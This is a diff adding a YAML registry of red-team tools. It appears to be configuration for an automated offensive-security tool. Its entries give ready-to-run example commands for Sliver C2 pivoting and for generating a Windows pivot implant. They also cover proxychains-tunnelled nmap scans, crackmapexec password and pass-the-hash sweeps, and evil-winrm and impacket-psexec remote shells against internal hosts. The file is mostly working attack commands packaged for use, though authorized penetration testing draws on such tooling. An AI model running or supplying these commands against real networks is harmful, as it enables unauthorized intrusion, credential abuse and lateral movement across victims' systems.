@@ -1,0 +1,43 @@
+sliver:
+  description: "Sliver C2 — built-in pivoting (portfwd, socks5, rportfwd, pipe pivots)"
+  category: c2
+  verify_cmd: "sliver version"
+  examples:
+    - "sliver [session] > portfwd add --remote HOST:PORT --bind 127.0.0.1:LPORT"
+    - "sliver [session] > socks5 start --port 1080"
+    - "sliver [session] > rportfwd add --remote 0.0.0.0:8080 --bind 127.0.0.1:80"
+    - "sliver > pivots tcp --bind 0.0.0.0:9898 --session SESSION_ID"
+    - "sliver > generate --tcp-pivot HOST:9898 --os windows --arch amd64 --save /tmp/pivot.exe"
+
+proxychains:
+  description: "Route any TCP tool through SOCKS5 proxy for pivoting"
+  category: pivoting
+  install_cmd: "apt-get install -y proxychains4"
+  verify_cmd: "proxychains -h 2>&1 | head -3"
+  examples:
+    - "proxychains nmap -sT -Pn -n 10.0.0.0/24 -p 22,80,445,3389 --open"
+    - "proxychains crackmapexec smb 10.0.0.0/24 -u admin -p Password123"
+    - "proxychains evil-winrm -i 10.0.0.5 -u admin -p Password123"
+    - "proxychains ssh admin@10.0.0.5"
+    - "proxychains impacket-psexec admin:Password123@10.0.0.5"
+
+nmap:
+  description: "Network scanner — use -sT -Pn through SOCKS proxy"
+  category: scanning
+  verify_cmd: "nmap --version"
+  examples:
+    - "proxychains nmap -sT -Pn -n -sV 10.0.0.5 -p 1-1000"
+
+crackmapexec:
+  description: "SMB/WinRM/LDAP/MSSQL network auth tool"
+  category: lateral_movement
+  verify_cmd: "crackmapexec --version"
+  examples:
+    - "proxychains crackmapexec smb 10.0.0.0/24 -u admin -H NTLM_HASH --shares"
+
+evil-winrm:
+  description: "WinRM shell for Windows lateral movement"
+  category: lateral_movement
+  verify_cmd: "evil-winrm --version 2>&1 | head -1"
+  examples:
+    - "proxychains evil-winrm -i 10.0.0.5 -u admin -p Password123"
